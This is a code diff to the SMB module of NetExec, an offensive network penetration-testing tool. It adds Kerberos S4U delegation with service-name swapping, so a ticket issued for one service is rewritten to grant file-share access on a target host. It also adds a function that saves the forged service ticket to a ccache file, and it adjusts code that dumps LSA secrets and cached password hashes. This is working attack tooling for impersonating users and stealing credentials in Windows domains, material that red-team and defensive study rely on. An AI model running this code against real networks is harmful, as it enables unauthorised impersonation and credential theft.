@@ -44,7 +44,7 @@ from nxc.helpers.misc import gen_random_string, validate_ntlm
 from nxc.logger import NXCAdapter
 from nxc.protocols.smb.dpapi import collect_masterkeys_from_target, get_domain_backup_key, upgrade_to_dploot_connection
 from nxc.protocols.smb.firefox import FirefoxCookie, FirefoxData, FirefoxTriage
-from nxc.protocols.smb.kerberos import kerberos_login_with_S4U
+from nxc.protocols.smb.kerberos import kerberos_login_with_S4U, kerberos_altservice, get_realm_from_ticket
 from nxc.protocols.smb.wmiexec import WMIEXEC
 from nxc.protocols.smb.atexec import TSCH_EXEC
 from nxc.protocols.smb.smbexec import SMBEXEC
@@ -368,9 +368,17 @@ class smb(connection):
             if self.args.delegate:
                 kerb_pass = ""
                 self.username = self.args.delegate
-                serverName = Principal(f"cifs/{self.hostname}", type=constants.PrincipalNameType.NT_SRV_INST.value)
-                tgs = kerberos_login_with_S4U(domain, self.hostname, username, password, nthash, lmhash, aesKey, kdcHost, self.args.delegate, serverName, useCache, no_s4u2proxy=self.args.no_s4u2proxy)
-                self.logger.debug(f"Got TGS for {self.args.delegate} through S4U")
+                serverName = Principal(self.args.delegate_spn if self.args.delegate_spn else f"cifs/{self.remoteName}", type=constants.PrincipalNameType.NT_SRV_INST.value)
+                tgs, sk = kerberos_login_with_S4U(domain, self.hostname, username, password, nthash, lmhash, aesKey, kdcHost, self.args.delegate, serverName, useCache, no_s4u2proxy=self.args.no_s4u2proxy)
+                self.logger.debug(f"TGS obtained for {self.args.delegate} for {serverName}")
+
+                spn = f"cifs/{self.remoteName}"
+                if self.args.delegate_spn:
+                    self.logger.debug(f"Swapping SPN to {spn} for TGS")
+                    tgs = kerberos_altservice(tgs, spn)
+
+                if self.args.generate_st:
+                    self.save_st(tgs, sk, spn if self.args.delegate_spn else None)
 
             self.conn.kerberosLogin(self.username, password, domain, lmhash, nthash, aesKey, kdcHost, useCache=useCache, TGS=tgs)
             if "Unix" not in self.server_os:
@@ -384,6 +392,9 @@ class smb(connection):
             used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
             if self.args.delegate:
                 used_ccache = f" through S4U with {username}"
+
+            if self.args.delegate_spn:
+                used_ccache = f" through S4U with {username} (w/ SPN {self.args.delegate_spn})"
 
             out = f"{self.domain}\\{self.username}{used_ccache} {self.mark_pwned()}"
             self.logger.success(out)
@@ -651,6 +662,28 @@ class smb(connection):
                 if self.host not in relay_list.read():
                     relay_list.write(self.host + "\n")
 
+    def save_st(self, st, sk, new_spn=None):
+        ccache = CCache()
+        tgs_rep = st["KDC_REP"]
+        session_key = sk
+
+        try:
+            ccache.fromTGS(tgs_rep, session_key, session_key)
+        except SessionKeyDecryptionError as e:
+            self.logger.fail(f"Failed to decrypt session key: {e}")
+            return
+
+        if new_spn:
+            # there is a new principal, likely from tampering the SPN during S4U2proxy
+            realm = get_realm_from_ticket(st)
+            principal = Principal(f"{new_spn}@{realm}", type=constants.PrincipalNameType.NT_SRV_INST.value)
+            self.logger.debug(f"Using principal {principal} for ST")
+            ccache.credentials[0]["server"].fromPrincipal(principal)
+
+        st_file = f"{self.args.generate_st.removesuffix('.ccache')}.ccache"
+        ccache.saveFile(st_file)
+        self.logger.success(f"Saved ST to {st_file}")
+
     def generate_tgt(self):
         self.logger.info(f"Attempting to get TGT for {self.username}@{self.domain}")
         userName = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
@@ -671,7 +704,7 @@ class smb(connection):
 
             ccache = CCache()
             ccache.fromTGT(tgt, oldSessionKey, sessionKey)
-            tgt_file = f"{self.args.generate_tgt}.ccache"
+            tgt_file = f"{self.args.generate_tgt.removesuffix('.ccache')}.ccache"
             ccache.saveFile(tgt_file)
 
             self.logger.success(f"TGT saved to: {tgt_file}")
@@ -2053,7 +2086,7 @@ class smb(connection):
             domain=self.domain,
             username=self.username,
             password=self.password,
-            target=f"{self.hostname}.{self.domain}" if self.kerberos else self.host,
+            target=self.remoteName,
             lmhash=self.lmhash,
             nthash=self.nthash,
             do_kerberos=self.kerberos,
@@ -2238,7 +2271,7 @@ class smb(connection):
                         isRemote=True,
                         perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
                     )
-                self.logger.success("Dumping LSA secrets")
+                self.logger.display("Dumping LSA secrets")
                 self.output_filename = self.output_file_template.format(output_folder="lsa")
                 LSA.dumpCachedHashes()
                 LSA.exportCached(self.output_filename)
